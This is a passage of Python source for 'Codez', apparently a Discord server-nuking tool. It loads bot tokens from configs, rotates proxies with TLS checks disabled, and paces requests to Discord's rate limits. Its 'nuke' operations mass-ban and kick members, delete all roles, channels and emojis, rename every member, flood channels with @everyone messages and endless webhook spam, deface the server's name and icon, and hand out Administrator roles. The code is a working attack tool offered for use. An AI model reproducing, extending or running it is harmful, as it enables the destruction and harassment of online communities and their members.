            lock_at = max(2, min(phase1_frames - 2, lock_at))
            row_locks.append(lock_at)
        lock_frame.append(row_locks)
    for frame in range(phase1_frames):
        if skipper.should_skip:
            break
        if frame > 0:
            sys.stdout.write(f"\033[{total_lines}A")
        t = frame / max(phase1_frames - 1, 1)
        hue_base = 240 if color_start == WIZZLER_START else 320
        for row_idx, line in enumerate(banner_lines):
            if len(line) > max_width:
                line = line[:max_width]
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, real_char in enumerate(line):
                locked = frame >= lock_frame[row_idx][col_idx]
                if real_char == ' ':
                    ch = ' '
                elif not locked:
                    reveal_chance = (frame / lock_frame[row_idx][col_idx]) ** 2
                    ch = real_char if random.random() < reveal_chance * 0.6 else ' '
                else:
                    ch = real_char
                if ch != ' ':
                    hue = hue_base + ((col_idx * 2 + row_idx * 6 + frame * 10) % 120)
                    val = min(1.0, t * 1.5)
                    r, g, b = hsv_to_rgb(hue, 0.8, val)
                    output += f"\033[38;2;{r};{g};{b}m{ch}"
                else:
                    output += " "
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.05)
    print()
    bar_width = min(30, cols - 20)
    label = f"  LOADING {mode_label.upper()}  "
    pad = max((cols - bar_width - len(label) - 4) // 2, 0)
    load_steps = bar_width
    for i in range(load_steps + 1):
        if skipper.should_skip:
            break
        filled = "|" * i
        empty = "|" * (bar_width - i)
        pct = int((i / load_steps) * 100)
        h_blend = i / max(load_steps, 1)
        r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
        g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
        b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
        bar_str = f"\033[38;2;{r};{g};{b}m\033[1m[{filled}{empty}] {pct:3d}%\033[0m"
        sys.stdout.write(f"\r{' ' * pad}{label}{bar_str}")
        sys.stdout.flush()
        time.sleep(0.02)
    sys.stdout.write("\n")
    ready_msg = format_log_message("SUCCESS", f"{mode_label} Menu Ready", 40)
    if not skipper.should_skip:
        print(ready_msg)
        time.sleep(0.3)
    else:
        print(ready_msg)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

async def switch_to_wizzler():
    global __mode__, WIZZLER_START, WIZZLER_END, __max_concurrent__
    __mode__ = "wizzler"
    __max_concurrent__ = __config__.get("max_concurrent", 50)
    WIZZLER_START, WIZZLER_END = pick_random_gradient()
    effect = random.choice([_cyberpunk_effect])
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()
    try:
        if asyncio.iscoroutinefunction(effect):
            await effect()
        else:
            effect()
    finally:
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()
    return True

async def switch_to_deadlizer():
    global __mode__, __max_concurrent__, DEADLIZER_START, DEADLIZER_END
    __mode__ = "deadlizer"
    __max_concurrent__ = __config__.get("max_concurrent", 50) * 3 
    DEADLIZER_START, DEADLIZER_END = pick_random_gradient()
    effect = random.choice([_carnage_effect])
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()
    try:
        if asyncio.iscoroutinefunction(effect):
            await effect()
        else:
            effect()
    finally:
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()
    return True

def switch_config(config_name):
    global __config__, __current_config_name__, token, __max_concurrent__
    if config_name not in __loaded_configs__:
        print(format_log_message("ERROR", f"Config '{config_name}' not found!", 47))
        return False
    __current_config_name__ = config_name
    __config__ = __loaded_configs__[config_name].copy()
    token = __config__["token"]
    __max_concurrent__ = __config__.get("max_concurrent", 50)
    if os.name == "nt":
        os.system(f'title Codez ON TOP - Max Concurrent: {__max_concurrent__} - Config: {__current_config_name__}')
    return True

def load_multiple_configs():
    global __loaded_configs__, __current_config_name__, __config__, token, __max_concurrent__
    os.system("cls") if os.name == "nt" else os.system("clear")
    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)
    config_files = [f for f in os.listdir(config_folder) if f.endswith(".json")]
    if not config_files:
        print(format_log_message("ERROR", "No JSON files found in 'configs' folder.", 50))
        os._exit(1)
    while True:
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Configs:", 50))
        print(gradient_text("╭" + "─" * 70 + "╮", mode_start, mode_end, bold=True))
        for i, config_file in enumerate(config_files, 1):
            print(gradient_text(f"│{i:<2} │ {config_file:<64} │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 70 + "╯", mode_start, mode_end, bold=True))
        print(format_log_message("INFO", "Enter numbers (e.g., 1,2), ranges (1-3), filenames, or 'all'", 30))
        choice_input = input(format_log_message("INPUT", "Choose config(s) to load", 50)).strip()
        if not choice_input:
            print(format_log_message("ERROR", "No input provided. Please enter config numbers or 'all'.", 45))
            continue
        choice_lower = choice_input.lower()
        indices = []
        invalid_tokens = []
        if choice_lower == 'all':
            indices = list(range(len(config_files)))
        else:
            tokens = [t.strip() for t in choice_input.split(',') if t.strip()]
            for tok in tokens:
                if '-' in tok and all(p.strip().isdigit() for p in tok.split('-', 1)):
                    try:
                        a_str, b_str = tok.split('-', 1)
                        a = int(a_str.strip()) - 1
                        b = int(b_str.strip()) - 1
                        if a <= b:
                            for idx in range(a, b + 1):
                                if 0 <= idx < len(config_files):
                                    indices.append(idx)
                                else:
                                    invalid_tokens.append(str(idx + 1))
                        else:
                            invalid_tokens.append(tok)
                    except Exception:
                        invalid_tokens.append(tok)
                elif tok.isdigit():
                    idx = int(tok) - 1
                    if 0 <= idx < len(config_files):
                        indices.append(idx)
                    else:
                        invalid_tokens.append(tok)
                else:
                    if tok in config_files:
                        indices.append(config_files.index(tok))
                    else:
                        invalid_tokens.append(tok)
        if invalid_tokens:
            print(format_log_message("ERROR", f"Invalid selections: {', '.join(invalid_tokens)}. Please try again.", 60))
            continue
        seen = set()
        final_indices = []
        for i in indices:
            if i not in seen and 0 <= i < len(config_files):
                final_indices.append(i)
                seen.add(i)
        if not final_indices:
            print(format_log_message("ERROR", "No valid configs selected. Please try again.", 50))
            continue
        for idx in final_indices:
            config_path = os.path.join(config_folder, config_files[idx])
            try:
                loaded_config = json.load(open(config_path, "r", encoding="utf-8"))
                __loaded_configs__[config_files[idx]] = loaded_config
                print(format_log_message("SUCCESS", f"Loaded {(config_files[idx])}", 52))
            except json.JSONDecodeError as e:
                print(format_log_message("ERROR", f"Invalid JSON in {config_files[idx]}: {str(e)}", 30))
            except Exception as e:
                print(format_log_message("ERROR", f"Error loading {config_files[idx]}: {str(e)}", 35))
        if not __loaded_configs__:
            print(format_log_message("ERROR", "No valid configs loaded! Please correct files and try again.", 43))
            continue
        __current_config_name__ = list(__loaded_configs__.keys())[0]
        __config__ = __loaded_configs__[__current_config_name__].copy()
        token = __config__["token"]
        __max_concurrent__ = __config__.get("max_concurrent", 50)
        print(format_log_message("SUCCESS", f"Active config: {(__current_config_name__)}", 45))
        time.sleep(1.5)
        break

def _passkey_gate():
    import sys, math
    os.system("cls") if os.name == "nt" else os.system("clear")
    try:
        cols = os.get_terminal_size().columns
        cols = min(cols, 80)
    except Exception:
        cols = 80
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    lock_art = [
        "██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗ ",
        "██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗",
        "██║     ██║   ██║██║     █████╔╝ █████╗  ██║  ██║",
        "██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██║  ██║",
        "███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██████╔╝",
        "╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ",
        "                                                 ",
    ]
    msg = "  ACCESS RESTRICTED | ENTER PASSKEY TO CONTINUE  "
    box_inner = len(msg)
    box_top = "╔" + "═" * box_inner + "╗"
    box_mid = "║" + msg + "║"
    box_bot = "╚" + "═" * box_inner + "╝"
    box_lines = [box_top, box_mid, box_bot]
    total_lines = len(lock_art) + 1 + len(box_lines)
    max_width = max(max(len(l) for l in lock_art), len(box_top))
    all_lines = lock_art + [""] + box_lines
    phase1 = 12
    lock_frame = []
    for ri, line in enumerate(all_lines):
        row_locks = []
        for ci in range(len(line)):
            cx, cy = max_width/2, len(all_lines)/2
            dist = math.sqrt((ci-cx)**2 + ((ri-cy)*3)**2)
            md = math.sqrt(cx**2 + (cy*3)**2)
            prog = dist / max(md, 1)
            lf = int(3 + prog*(phase1-8)) + random.randint(-2,2)
            row_locks.append(max(2, min(phase1-2, lf)))
        lock_frame.append(row_locks)
    for frame in range(phase1):
        if skipper.should_skip: break
        if frame > 0:
            sys.stdout.write(f"\033[{len(all_lines)}A")
        t = frame / max(phase1-1, 1)
        for ri, line in enumerate(all_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            is_box = ri >= len(lock_art) + 1
            for ci, real_ch in enumerate(line):
                locked = frame >= lock_frame[ri][ci]
                if real_ch == ' ':
                    ch = ' '
                elif not locked:
                    reveal = (frame / lock_frame[ri][ci]) ** 2
                    ch = real_ch if random.random() < reveal*0.6 else ' '
                else:
                    ch = real_ch
                if ch != ' ':
                    if is_box:
                        hue_base = 320
                    else:
                        hue_base = 240
                    hue = hue_base + ((ci*2 + ri*6 + frame*10) % 120)
                    val = min(1.0, t*1.5)
                    r, g, b = hsv_to_rgb(hue, 0.8, val)
                    output += f"\033[38;2;{r};{g};{b}m{ch}"
                else:
                    output += " "
            sys.stdout.write(" "*pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.05)
    skipper.stop()
    print()
    CORRECT_KEY = "codez4ever"
    MAX_ATTEMPTS = 3
    for attempt in range(1, MAX_ATTEMPTS + 1):
        try:
            import sys as _sys
            prompt = format_log_message("INPUT", f"Enter Passkey [{attempt}/{MAX_ATTEMPTS}]", 50)
            if os.name == 'nt':
                import msvcrt as _m
                _sys.stdout.write(prompt)
                _sys.stdout.flush()
                key = ""
                while True:
                    ch = _m.getwch()
                    if ch in ('\r', '\n'):
                        _sys.stdout.write('\n')
                        _sys.stdout.flush()
                        break
                    elif ch == '\x03':
                        raise KeyboardInterrupt
                    elif ch in ('\x08', '\x7f'):
                        if key:
                            key = key[:-1]
                            _sys.stdout.write('\b \b')
                            _sys.stdout.flush()
                    else:
                        key += ch
                        _sys.stdout.write('*')
                        _sys.stdout.flush()
            else:
                import getpass as _gp
                _sys.stdout.write(prompt)
                _sys.stdout.flush()
                try:
                    key = _gp.getpass(prompt='', stream=_sys.stdout)
                except Exception:
                    import tty, termios
                    fd = _sys.stdin.fileno()
                    old_settings = termios.tcgetattr(fd)
                    key = ""
                    try:
                        tty.setraw(fd)
                        while True:
                            ch = _sys.stdin.read(1)
                            if ch in ('\r', '\n'):
                                _sys.stdout.write('\n')
                                _sys.stdout.flush()
                                break
                            elif ch == '\x03':
                                raise KeyboardInterrupt
                            elif ch in ('\x08', '\x7f'):
                                if key:
                                    key = key[:-1]
                                    _sys.stdout.write('\b \b')
                                    _sys.stdout.flush()
                            else:
                                key += ch
                                _sys.stdout.write('*')
                                _sys.stdout.flush()
                    finally:
                        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            if key.strip() == CORRECT_KEY:
                print()
                print(format_log_message("SUCCESS", "Access granted. Welcome back.", 40))
                time.sleep(0.5)
                os.system("cls") if os.name == "nt" else os.system("clear")
                return
            remaining = MAX_ATTEMPTS - attempt
            if remaining > 0:
                print(format_log_message("ERROR", f"Wrong passkey. {remaining} attempt(s) left.", 40))
            else:
                print()
                print(format_log_message("ERROR", "Too many failed attempts. Exiting.", 40))
                time.sleep(1.0)
                os._exit(1)
        except (KeyboardInterrupt, EOFError):
            print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
            os._exit(0)

# ==================== COMPLETE SHAKTI CLASS ====================
class RateLimiter:
    def __init__(self, max_concurrent):
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def __aenter__(self):
        await self.semaphore.acquire()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        self.semaphore.release()


class shakti:
    def __init__(self, guildid):
        self.guildid = guildid
        self.guild = None
        self.has_proxies = False
        self.proxy_count = 0
        self._proxy_list = []
        self._proxy_sessions = {}
        self._proxy_idx = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if not proxy:
                        continue
                    if "@" in proxy:
                        creds, addr = proxy.rsplit("@", 1)
                    else:
                        creds, addr = None, proxy
                    if ":" not in addr:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{proxy}'. Skipping.", 16))
                        continue
                    host, port = addr.rsplit(":", 1)
                    if not port.isdigit():
                        print(format_log_message("ERROR", f"Invalid proxy port in '{proxy}'. Skipping.", 19))
                        continue
                    url = f"http://{creds}@{addr}" if creds else f"http://{addr}"
                    valid_proxies.append(url)
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self._proxy_list = valid_proxies
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {len(valid_proxies)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))
            time.sleep(2)

        self.version = cycle(['v9','v10'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = RateLimiter(__max_concurrent__)
        self.session = None
        self._route_buckets = {}
        self._bucket_lock = asyncio.Lock()
        self.token = __config__["token"]
        self.concurrent = __max_concurrent__
        self.whitelist_file = "configs/whitelist.txt"
        self.whitelist = self._load_whitelist()
        self.auto_admin_enabled = False
        self.menu_shown_once = False
        self._animating = False
        print(format_log_message("SUCCESS", f"Loaded {(str(len(self.whitelist)))} whitelisted members.", 22))
        time.sleep(1)

    def _load_whitelist(self):
        try:
            if not os.path.exists(self.whitelist_file):
                return set()
            with open(self.whitelist_file, "r") as f:
                return set(line.strip() for line in f if line.strip() and line.strip().isdigit())
        except Exception:
            return set()

    def _save_whitelist(self):
        try:
            os.makedirs(os.path.dirname(self.whitelist_file) or 'configs', exist_ok=True)
            with open(self.whitelist_file, "w") as f:
                f.write('\n'.join(sorted(list(self.whitelist))))
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to save whitelist: {e}", 36))

    async def add_to_whitelist(self, user_id):
        user_id = user_id.strip()
        if not user_id.isdigit():
            print(format_log_message("ERROR", f"Invalid User ID: {user_id}", 40))
            return False
        if user_id in self.whitelist:
            print(format_log_message("INFO", f"User {user_id} already whitelisted", 40))
            return False
        self.whitelist.add(user_id)
        self._save_whitelist()
        print(format_log_message("SUCCESS", f"Whitelisted User ID: {user_id}", 40))
        return True

    async def remove_from_whitelist(self, user_id):
        user_id = user_id.strip()
        if user_id in self.whitelist:
            self.whitelist.remove(user_id)
            self._save_whitelist()
            print(format_log_message("SUCCESS", f"Removed User ID: {user_id} from whitelist", 35))
            return True
        print(format_log_message("ERROR", f"User {user_id} not found in whitelist", 40))
        return False

    # FIXED: Only accept prompt, no extra args
    async def async_input(self, prompt: str):
        try:
            user_input = await asyncio.get_event_loop().run_in_executor(None, lambda: input(prompt))
            if user_input.lower().strip() in ['d', 'dd', 'ddd']:
                if __mode__ == "wizzler":
                    await switch_to_deadlizer()
                else:
                    await switch_to_wizzler()
                return "MODE_SWITCHED"
            await asyncio.sleep(0.1)
            return user_input
        except KeyboardInterrupt:
            os.system("cls") if os.name == "nt" else os.system("clear")
            print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
            os._exit(0)

    async def _get_session(self):
        _headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json",
            "User-Agent": "DiscordBot (https://discord.com, 10)",
            "Connection": "keep-alive",
        }
        if __mode__ == "deadlizer":
            _limits = httpx.Limits(max_connections=150, max_keepalive_connections=75, keepalive_expiry=60.0)
            _timeout = httpx.Timeout(connect=5.0, read=8.0, write=5.0, pool=5.0)
        else:
            _limits = httpx.Limits(max_connections=100, max_keepalive_connections=50, keepalive_expiry=120.0)
            _timeout = httpx.Timeout(connect=10.0, read=15.0, write=10.0, pool=10.0)
        if __config__.get("proxy") and self.has_proxies:
            proxy_url = self._proxy_list[self._proxy_idx % len(self._proxy_list)]
            self._proxy_idx += 1
            if proxy_url not in self._proxy_sessions or self._proxy_sessions[proxy_url].is_closed:
                self._proxy_sessions[proxy_url] = httpx.AsyncClient(
                    http2=True, proxies=proxy_url,
                    limits=_limits, timeout=_timeout,
                    headers=_headers, verify=False,
                )
            return self._proxy_sessions[proxy_url]
        if self.session is None or self.session.is_closed:
            self.session = httpx.AsyncClient(
                http2=True, limits=_limits, timeout=_timeout,
                headers=_headers, verify=False,
            )
        return self.session

    def _route_key(self, method: str, url: str) -> str:
        import re
        key = re.sub(r'/\d{15,21}', '/{id}', url)
        return f"{method.upper()}:{key}"

    async def _update_bucket(self, route_key: str, headers) -> None:
        remaining = headers.get("X-RateLimit-Remaining")
        reset_after = headers.get("X-RateLimit-Reset-After")
        if remaining is None or reset_after is None:
            return
        async with self._bucket_lock:
            self._route_buckets[route_key] = {
                "remaining": int(remaining),
                "reset_after": float(reset_after),
                "reset_at": time.monotonic() + float(reset_after),
            }

    async def _wait_for_bucket(self, route_key: str) -> None:
        async with self._bucket_lock:
            bucket = self._route_buckets.get(route_key)
            if not bucket:
                return
            if bucket["remaining"] <= 0:
                wait = bucket["reset_at"] - time.monotonic()
                if wait > 0:
                    await asyncio.sleep(wait + 0.02)
                self._route_buckets.pop(route_key, None)

    async def _api_request(self, method, url, token, max_retries=3, extra_headers=None, ignore_429=False, **kwargs):
        session = await self._get_session()
        route_key = self._route_key(method, url)
        headers = {"Authorization": f"Bot {token}"}
        if extra_headers:
            headers.update(extra_headers)
        for attempt in range(max_retries):
            await self._wait_for_bucket(route_key)
            try:
                response = await getattr(session, method)(url, headers=headers, **kwargs)
                await self._update_bucket(route_key, response.headers)
                if response.status_code == 429:
                    if ignore_429:
                        return response
                    try:
                        header_val = response.headers.get("X-RateLimit-Reset-After")
                        body_val = response.json().get("retry_after", 1.0)
                        if header_val is not None:
                            retry_after = max(float(header_val), float(body_val))
                        else:
                            retry_after = float(body_val)
                    except Exception:
                        retry_after = 1.0 + attempt * 0.5
                    retry_after += random.uniform(0.05, 0.15)
                    async with self._bucket_lock:
                        self._route_buckets[route_key] = {
                            "remaining": 0,
                            "reset_after": retry_after,
                            "reset_at": time.monotonic() + retry_after,
                        }
                    print(format_log_message("INFO", f"Rate limited — waiting {retry_after:.2f}s", 45))
                    await asyncio.sleep(retry_after)
                    continue
                return response
            except (httpx.TimeoutException, httpx.ConnectError):
                if attempt < max_retries - 1:
                    continue
                return None
            except Exception:
                return None
        return None

    # ==================== ALL NUKE OPERATIONS ====================
    
    async def execute_ban(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Ban)", 41))
            return True
        async with self.semaphore:
            ban_reason = __config__.get("operations", {}).get("ban_reason", "Nuked by Codez")
            payload = {"delete_message_days": random.randint(0, 7)}
            try:
                response = await self._api_request("put", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}", token, extra_headers={"X-Audit-Log-Reason": ban_reason}, ignore_429=True, json=payload)
                if response is None:
                    return False
                if response.status_code in [200, 201, 204]:
                    print(format_log_message("SUCCESS", f"Banned {member}", 52))
                    self.banned.append(member)
                    return True
                else:
                    return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to ban {member} | {e}", 46))
                return False

    async def execute_kick(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Kick)", 41))
            return True
        async with self.semaphore:
            try:
                response = await self._api_request("delete", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}", token)
                if response and response.status_code in [200, 201, 204]:
                    print(format_log_message("SUCCESS", f"Kicked {member}", 52))
                    self.kicked.append(member)
                    return True
                return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to kick {member} | {e}", 46))
                return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            try:
                roles_resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/roles", token)
                role_ids = []
                if roles_resp and roles_resp.status_code == 200:
                    role_ids = [r['id'] for r in roles_resp.json() if r['id'] != self.guildid]
                pruned_total = 0
                if role_ids:
                    payload = {"days": days, "compute_prune_count": True, "include_roles": role_ids}
                    resp1 = await self._api_request("post", f"https://discord.com/api/v10/guilds/{self.guildid}/prune", token, json=payload)
                    if resp1 and resp1.status_code == 200:
                        pruned_total += resp1.json().get('pruned', 0)
                payload_no_roles = {"days": days, "compute_prune_count": True}
                resp2 = await self._api_request("post", f"https://discord.com/api/v10/guilds/{self.guildid}/prune", token, json=payload_no_roles)
                if resp2 and resp2.status_code == 200:
                    pruned_total += resp2.json().get('pruned', 0)
                if pruned_total > 0:
                    print(format_log_message("SUCCESS", f"Pruned {pruned_total} members total", 43))
                return pruned_total
            except Exception:
                return 0

    async def execute_crechannels(self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            payload = {"type": type_, "name": channelsname.replace(" ", "-"), "permission_overwrites": []}
            try:
                response = await self._api_request("post", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels", token, json=payload)
                if response and response.status_code == 201:
                    print(format_log_message("SUCCESS", f"Created channel {channelsname}", 42))
                    self.channels.append(1)
                    return True
                return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create channel | {e}", 40))
                return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0xFFFF00, 0x00FFFF, 0xFF00FF])
            payload = {"name": rolesname, "color": colors}
            try:
                response = await self._api_request("post", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles", token, json=payload)
                if response and response.status_code == 200:
                    print(format_log_message("SUCCESS", f"Created role {rolesname}", 45))
                    self.roles.append(1)
                    return True
                return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create role | {e}", 40))
                return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:
            try:
                response = await self._api_request("delete", f"https://discord.com/api/{next(self.version)}/channels/{channel}", token)
                if response and response.status_code == 200:
                    print(format_log_message("SUCCESS", f"Deleted channel {channel}", 42))
                    self.channels.append(channel)
                    return True
                return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to delete channel | {e}", 44))
                return False

    async def execute_delroles_all(self, token: str):
        try:
            resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/roles", token)
            if not resp or resp.status_code != 200:
                return 0
            roles = resp.json()
            roles_to_delete = [r['id'] for r in roles if r['id'] != self.guildid]
            success_count = 0
            for role_id in roles_to_delete:
                async with self.semaphore:
                    r = await self._api_request("delete", f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role_id}", token)
                    if r and r.status_code in (200, 204):
                        success_count += 1
                        print(format_log_message("SUCCESS", f"Deleted role {role_id}", 45))
            return success_count
        except Exception as e:
            print(format_log_message("ERROR", f"Mass role deletion failed: {e}", 40))
            return 0

    async def execute_delemojis_all(self, token: str):
        try:
            resp = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis", token)
            if not resp or resp.status_code != 200:
                return 0
            emojis = resp.json()
            success_count = 0
            for emoji in emojis:
                async with self.semaphore:
                    r = await self._api_request("delete", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis/{emoji['id']}", token)
                    if r and r.status_code in (200, 204):
                        success_count += 1
                        print(format_log_message("SUCCESS", f"Deleted emoji {emoji['id']}", 45))
            return success_count
        except Exception as e:
            print(format_log_message("ERROR", f"Mass emoji deletion failed: {e}", 38))
            return 0

    async def execute_massping(self, channel: str, content: str, token: str):
        async with self.semaphore:
            if not content:
                content = "@everyone @here Wizzed by Codez!"
            payload = {"content": content}
            try:
                response = await self._api_request("post", f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", token, json=payload)
                if response and response.status_code == 200:
                    print(format_log_message("SUCCESS", f"Spammed in {channel}", 47))
                    self.messages.append(channel)
                    return True
                return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to spam | {e}", 42))
                return False

    async def execute_spam_all_channels(self, token: str):
        session = await self._get_session()
        spam_message = __config__.get("operations", {}).get("spam_message", "@everyone @here Wizzed by Codez!")
        try:
            resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels", headers={"Authorization": f"Bot {token}"})
            if resp.status_code == 200:
                channels = resp.json()
                text_channels = [c for c in channels if c['type'] == 0]
            else:
                return 0
        except Exception:
            return 0
        if not text_channels:
            return 0
        spam_tasks = [self.execute_massping(channel['id'], spam_message, token) for channel in text_channels]
        results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        return sum(1 for r in results if r is True)

    async def execute_webhook_spam(self, token: str):
        webhook_config = __config__.get("nuke", {}).get("webhooks", {})
        webhook_name = webhook_config.get("name", "Codez op")
        webhook_messages = webhook_config.get("messages", ["@everyone @here Wizzed by Codez"])
        fast_client = httpx.AsyncClient(limits=httpx.Limits(max_connections=512, max_keepalive_connections=256), timeout=httpx.Timeout(8.0))
        try:
            resp = await fast_client.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels", headers={"Authorization": f"Bot {token}"})
            if resp.status_code == 200:
                channels = resp.json()
                text_channels = [c for c in channels if c['type'] == 0]
            else:
                return 0
        except Exception:
            return 0
        if not text_channels:
            return 0
        async def try_create(channel):
            try:
                r = await fast_client.post(f"https://discord.com/api/v10/channels/{channel['id']}/webhooks", headers={"Authorization": f"Bot {token}"}, json={"name": webhook_name})
                if r.status_code in [200, 201]:
                    return r.json().get("url")
                return None
            except Exception:
                return None
        async def spam_one_webhook(webhook_url):
            while True:
                try:
                    msg = random.choice(webhook_messages)
                    r = await fast_client.post(webhook_url, json={"content": msg}, timeout=10.0)
                    if r.status_code in [200, 204]:
                        pass
                    elif r.status_code == 404:
                        break
                    else:
                        await asyncio.sleep(0.2)
                except Exception:
                    await asyncio.sleep(0.1)
        for channel in text_channels:
            url = await try_create(channel)
            if url:
                asyncio.create_task(spam_one_webhook(url))
        return len(text_channels)

    async def execute_nick_all_fast(self, token: str, new_nick: str = None):
        if not new_nick:
            new_nick = __config__.get("operations", {}).get("nick_users_to", "Wizzed by Codez")
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip() and line.strip().isdigit()]
        except:
            print(format_log_message("ERROR", "members.txt missing or empty", 40))
            return 0
        members = [m for m in members if m not in self.whitelist]
        total = len(members)
        if total == 0:
            return 0
        success_count = 0
        async def nick_one(member_id: str):
            nonlocal success_count
            async with self.semaphore:
                try:
                    resp = await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}", token, json={"nick": new_nick})
                    if resp and resp.status_code in (200, 204):
                        success_count += 1
                        print(f"{format_log_message('SUCCESS', f'Nicked {member_id}', 52)}")
                except:
                    pass
        await asyncio.gather(*(nick_one(mid) for mid in members), return_exceptions=True)
        print(format_log_message("SUCCESS", f"Nicked {success_count}/{total} members", 55))
        return success_count

    async def execute_change_icon(self, token: str):
        if not os.path.exists("Guild-Icon"):
            print(format_log_message("ERROR", "Guild-Icon folder not found!", 38))
            return False
        images = [f for f in os.listdir("Guild-Icon") if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
        if not images:
            print(format_log_message("ERROR", "No images in Guild-Icon folder!", 36))
            return False
        for i, img in enumerate(images, 1):
            print(f"{i}: {img}")
        try:
            choice = int((await self.async_input(format_log_message("INPUT", "Choose icon number", 50))).strip()) - 1
            if 0 <= choice < len(images):
                img_path = os.path.join("Guild-Icon", images[choice])
                with open(img_path, "rb") as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                ext = images[choice].split('.')[-1]
                payload = {"icon": f"data:image/{ext};base64,{img_data}"}
                async with self.semaphore:
                    response = await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}", token, json=payload)
                    if response and response.status_code in [200, 204]:
                        print(format_log_message("SUCCESS", "Changed guild icon", 42))
                        return True
            return False
        except:
            return False

    async def execute_change_guild_info(self, token: str, new_name: str = None, new_desc: str = None):
        if new_name is None:
            default_name = __config__.get("operations", {}).get("guild_name", "Nuked By Codez")
            new_name = await self.async_input(format_log_message("INPUT", f"New guild name (default: {default_name})", 50))
            new_name = new_name.strip() or default_name
        if new_desc is None:
            new_desc = await self.async_input(format_log_message("INPUT", "New guild description", 50))
            new_desc = new_desc.strip()
        payload = {"name": new_name}
        if new_desc:
            payload["description"] = new_desc
        async with self.semaphore:
            response = await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}", token, json=payload)
            if response and response.status_code in [200, 204]:
                print(format_log_message("SUCCESS", f"Guild updated: {new_name}", 43))
                return True
            return False

    async def execute_give_admin(self, token: str):
        try:
            admin_role_payload = {"name": "Admin", "color": 0xFF0000, "permissions": "8"}
            role_resp = await self._api_request("post", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles", token, json=admin_role_payload)
            if not role_resp or role_resp.status_code != 200:
                return (0, 0)
            admin_role_id = role_resp.json()['id']
            user_input = await self.async_input(format_log_message("INPUT", "User IDs (comma-separated) or 'all'", 50))
